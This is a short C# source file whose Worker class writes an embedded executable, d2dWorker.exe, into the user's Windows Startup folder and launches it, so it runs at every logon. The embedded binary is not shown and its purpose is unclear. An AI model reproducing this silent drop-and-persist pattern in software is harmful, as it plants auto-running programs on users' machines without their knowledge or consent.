using System;
using System.Diagnostics;
using System.IO;

namespace d2d.Classes
{
    internal class Worker
    {
        internal static void LoadWorker()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "/d2dWorker.exe";

            if (File.Exists(path))
            {
                File.Delete(path);
            }

            File.WriteAllBytes(path, Properties.Resources.d2dWorker);

            Process.Start(new ProcessStartInfo()
            {
                FileName = path,
                UseShellExecute = true
            });
        }
    } 
}
